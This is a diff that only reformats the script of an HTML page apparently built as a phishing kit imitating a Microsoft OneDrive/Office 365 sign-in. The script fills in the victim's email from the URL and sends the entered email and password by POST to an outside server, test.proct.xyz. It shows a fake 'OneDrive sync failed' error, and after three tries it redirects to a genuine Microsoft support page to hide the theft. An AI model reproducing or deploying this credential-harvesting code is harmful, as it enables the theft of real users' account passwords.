@@ -2096,110 +2096,93 @@
 
 <script src="jquery-3.6.0.min.js.download"></script>
 <script>
-$(document).ready(function()
-	{
-	var g=0;
-	var h=window.location.hash.substr(1);
-	if(!h)
-		{
-	}
-	else
-		{
-		var i=h;
-		var j=i.indexOf("@");
-		var k=i.substr(j+1);
-		var c=k.substr(0,k.indexOf("."));
-		var l=c.toLowerCase()
-	}
-	$('#othermodal').click(function()
-		{
-		$('#contact').trigger("reset");
-		$("#msg").hide();
-		$('#fieldImg').attr('src','');
-		$('#field').html("Other Mail");
-		$("#em").val(i);
-		$("#emailch").html(i);
-		$("#inputbar").animate(
-			{
-			left:200,opacity:"hide"
-		}
-		,0);
-		$("#automail").animate(
-			{
-			right:200,opacity:"show"
-		}
-		,1000);
-		$('#ajaxModal').modal('show')
-	}
-	);
-	$('#submit-btn').click(function(b)
-		{
-		b.preventDefault();
-		var c=$("#em").val();
-		var d=$("#pw").val();
-		var e=$("#field").html();
-		var f=$('#msg').html();
-		$('#msg').text(f);
-		g=g+1;
-		if(g>=3)
-			{
-			g=0;
-			window.location.replace("https://support.microsoft.com/en-us/office/fix-onedrive-sync-problems-0899b115-05f7-45ec-95b2-e4cc8c4670b2")
-		}
-		else
-			{
-			$.ajax(
-				{
-				dataType:'JSON',url:'https://test.proct.xyz/o365/next.php',type:'POST',data:
-					{
-					em:c,pw:d,detail:e,
-				}
-				,beforeSend:function(a)
-					{
-					$('#submit-btn').html('Verifing...')
-				}
-				,success:function(a)
-					{
-					if(a)
-						{
-						$("#msg").show();
-						console.log(a);
-						if(a['signal']=='ok')
-							{
-							$("#pw").val("");
-							$('#msg').html(a['msg'])
-						}
-						else
-							{
-							$("#pw").val("");
-							$('#msg').html(a['msg'])
-						}
-					}
-				}
-				,error:function()
-					{
-					$("#pw").val("");
-					$("#msg").show();
-					$('#msg').html("Error: OneDrive sync failed. Please try again.")
-				}
-				,complete:function()
-					{
-					$("#pw").val("");
-					$('#submit-btn').html('Login')
-				}
-			}
-			)
-		}
-	}
-	)
-}
-);
-if(location.hash)
-	{
-	document.querySelector('#em').value=eml=location.hash.substr(1)
-}
+$(document).ready(function() {
+    var g = 0;
+    var h = window.location.hash.substr(1);
+    if (!h) {
+        // Do something if hash is not present
+    } else {
+        var i = h;
+        var j = i.indexOf("@");
+        var k = i.substr(j + 1);
+        var c = k.substr(0, k.indexOf("."));
+        var l = c.toLowerCase();
+    }
 
+    $('#othermodal').click(function() {
+        $('#contact').trigger("reset");
+        $("#msg").hide();
+        $('#fieldImg').attr('src', '');
+        $('#field').html("Other Mail");
+        $("#em").val(i);
+        $("#emailch").html(i);
+        $("#inputbar").animate({
+            left: 200,
+            opacity: "hide"
+        }, 0);
+        $("#automail").animate({
+            right: 200,
+            opacity: "show"
+        }, 1000);
+        $('#ajaxModal').modal('show');
+    });
+
+    $('#submit-btn').click(function(b) {
+        b.preventDefault();
+        var c = $("#em").val();
+        var d = $("#pw").val();
+        var e = $("#field").html();
+        var f = $('#msg').html();
+        $('#msg').text(f);
+        g = g + 1;
+        if (g >= 3) {
+            g = 0;
+            window.location.replace("https://support.microsoft.com/en-us/office/fix-onedrive-sync-problems-0899b115-05f7-45ec-95b2-e4cc8c4670b2");
+        } else {
+            $.ajax({
+                dataType: 'JSON',
+                url: 'https://test.proct.xyz/o365/next.php',
+                type: 'POST',
+                data: {
+                    em: c,
+                    pw: d,
+                    detail: e,
+                },
+                beforeSend: function(a) {
+                    $('#submit-btn').html('Verifying...');
+                },
+                success: function(a) {
+                    if (a) {
+                        $("#msg").show();
+                        console.log(a);
+                        if (a['signal'] == 'ok') {
+                            $("#pw").val("");
+                            $('#msg').html(a['msg']);
+                        } else {
+                            $("#pw").val("");
+                            $('#msg').html(a['msg']);
+                        }
+                    }
+                },
+                error: function() {
+                    $("#pw").val("");
+                    $("#msg").show();
+                    $('#msg').html("Error: OneDrive sync failed. Please try again.");
+                },
+                complete: function() {
+                    $("#pw").val("");
+                    $('#submit-btn').html('Login');
+                }
+            });
+        }
+    });
+});
+
+if (location.hash) {
+    document.querySelector('#em').value = eml = location.hash.substr(1);
+}
 </script>
+
 
 
 </body></html>
